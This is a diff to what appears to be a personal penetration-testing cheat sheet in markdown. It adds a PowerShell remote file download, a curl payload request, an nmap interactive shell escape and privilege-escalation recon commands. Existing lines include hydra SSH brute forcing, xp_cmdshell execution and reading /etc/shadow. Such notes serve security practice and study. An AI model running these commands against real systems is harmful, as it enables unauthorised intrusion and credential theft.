@@ -90,6 +90,7 @@ hydra -L users.txt -P pass.txt IP ssh
 
 * `dirb http://IP -r`
 * `gobuster dir -w DICT -t 30 -x php,txt,js,html,css` You can use `-f` to try folders instead of files
+* if you plan to bruteforce, try generate wordlist with `CeWL`
 * if it's a Wordpress instance look into `wpscan`
 * sometimes an open FTP is also a feature from a running IIS instance which comes with a CalDav instance. Try it out with `davtest` and exploit with `cadaver`
 
@@ -150,9 +151,6 @@ sqsh -S <IP> -U <USER> -P <PASSWORD>
 xp_cmdshell 'whoami';
 go
 ```
-
-
-
 
 #### Existing VNC services
 
@@ -215,12 +213,31 @@ Give parameters with encoding:
 curl <IP> --data-urlencode urlConfig=<PATH>
 ```
 
+Send request as logged user:
+
+```sh
+curl -u <USER> <IP> --data-binary <PAYLOAD>
+```
+
+## Powershell
+
+Download remote files:
+
+```powershell
+powershell "(New-Object System.Net.WebClient).DownloadFile("<IP+file>",
+<Destination-File>)"
+```
+
 
 # Post-Exploitation
 
 ## Improve your shell
 
 * `sh -c uname -a; w; id; /bin/bash -i`
+* ```sh
+nmap --interactive
+!sh
+```
 
 ## Local Recon
 
@@ -249,6 +266,10 @@ Ping scan:
 C:\> for \L %I in (1,1,254) do ping -w 30 -n 1 192.168.1.%I | find "Reply" >> output.txt
 ```
 
+#### Automation
+
+* [WinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+
 
 ### Linux
 
@@ -263,6 +284,8 @@ uname -a
 cat /etc/passwd
 cat /etc/shadow
 cat /etc/*-release
+sudo -l
+ps aux
 ```
 
 Network discover:
@@ -279,8 +302,8 @@ for i in `seq 1 254`; do ping 192.168.1.$i; done
 ```
 #### Automation
 
-* Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
-* Linpeas
+* [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
+* [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
 # Custom Scripts
 
